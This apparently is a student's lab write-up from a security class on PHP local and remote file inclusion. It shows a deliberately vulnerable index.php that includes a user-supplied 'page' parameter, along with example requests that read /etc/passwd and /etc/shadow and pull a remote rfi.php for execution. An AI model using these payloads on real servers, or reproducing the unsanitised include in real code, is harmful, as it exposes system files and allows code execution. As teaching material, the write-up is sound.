---
layout: /src/layouts/MarkdownLayout.astro
---

# Week 2

## File Inclusion Testing w/ PHP Server
For the 2.2 class activity, we made a sample PHP script that lets you grab arbitrary system files, but shows how you could end up with this vulnerability while having the best intentions.

Here's index.php:
```php
<a href="index.php?page=page1.html"><button>page1</button></a><br/>
<a href="index.php?page=page2.html"><button>page2</button></a><br/>
<a href="index.php?page=page3.html"><button>page3</button></a><br/>
<?php
$page = $_GET['page'];
echo "<div>";
if(isset($page))
{
 
  include("$page");
}
else
{
  echo "<p>select a page</p>";
}
echo "</div>";
?>
```

As you can see, the purpose is to display other pages within the index, which is something a real developer might want to do, but you can also see that our developer has made no effort to stop you from just... putting other paths in it.

for example, if you went to `index.php?page=/etc/passwd`, you can view that file. If you're really lucky, and the web admin has made PHP and/or the web server run as `root`, you could probably even grab `/etc/shadow`

Then, for the second part of this activity, we grabbed `php.ini` from `/etc/php/cli`, and enabled `allow_url_include`, which then lets us do silly things like: `index.php?page=http://127.0.0.1:8000/rfi.php`, and then that PHP file gets pulled, and also executed!

In my case, I just made `rfi.php` execute `pwd && whoami`, but you could also be malicious, at least within whatever permissions PHP is running as (in this case, we were using `php -S`, so `rm`'ing anything would have nuked my own personal files :( )

Useful commands for this lab were:
* `php -S 127.0.0.1:9000` - serve PHP files in CWD on port 9000
* `php -S 127.0.0.1:9000 -c php.ini` - same thing but with a custom `php.ini` to disable what are, I feel, pretty sane defaults actually
* `python -m http.server 8000` - serve CWD files with HTTP on port 8000 (used to pretend that `rfi.php` was some remote script that I wrote, in order to test web content inclusion as discussed above) 
